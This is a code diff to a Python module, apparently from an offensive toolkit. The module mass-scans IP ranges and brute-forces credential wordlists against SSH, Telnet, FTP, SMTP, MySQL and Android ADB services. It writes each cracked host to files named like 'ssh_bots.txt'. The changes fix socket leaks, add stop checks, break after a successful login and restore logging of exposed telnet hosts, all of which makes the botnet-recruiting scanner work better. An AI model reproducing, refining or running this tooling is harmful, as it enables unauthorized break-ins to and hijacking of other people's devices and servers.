@@ -1,4 +1,4 @@
-import os,sys,socket,random,time,threading,smtplib,telnetlib
+import os,sys,socket,random,time,threading,smtplib,xtelnet
 from bane.payloads import *
 from bane.vulns import adb_exploit,exposed_telnet
 from ftplib import FTP
@@ -59,10 +59,13 @@ class iots(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,22))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
     for x in wordlist:
+     if stop==True:
+         break
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
@@ -78,6 +81,8 @@ class iots(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
@@ -124,14 +129,14 @@ class iott(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,23))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
     if exposed_telnet(ip,timeout=self.timeout)==True:
-        """ip+='::'
+        ip+='::'
         print (ip)
-        write_file(ip,filen)"""
-        pass
+        write_file(ip,filen)
     else:
      for x in wordlist:
       try:
@@ -142,8 +147,11 @@ class iott(threading.Thread):
         ip+=':'+username+':'+password
         print (ip)
         write_file(ip,filen)
+        break
       except Exception as e: 
        pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
@@ -190,6 +198,7 @@ class iotelt(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,23))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -200,6 +209,8 @@ class iotelt(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
@@ -246,6 +257,7 @@ class iotf1(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,21))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -259,6 +271,8 @@ class iotf1(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
@@ -305,6 +319,7 @@ class iotf2(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,21))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -314,6 +329,8 @@ class iotf2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
@@ -357,6 +374,7 @@ class iotsm(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,25))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -370,6 +388,8 @@ class iotsm(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
@@ -418,6 +438,7 @@ class iotmy(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,3306))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -431,6 +452,8 @@ class iotmy(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
@@ -478,6 +501,7 @@ class iotmy2(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,3306))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -488,6 +512,8 @@ class iotmy2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
@@ -534,6 +560,7 @@ class iotadb(threading.Thread):
     so.settimeout(self.timeout)
     so.connect((ip,5555))
     i=True
+    so.close()
    except Exception as ex: 
     pass
    if i==True:
@@ -544,6 +571,8 @@ class iotadb(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
+  self.ip_seg=None
+  self.timeout=None
 def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
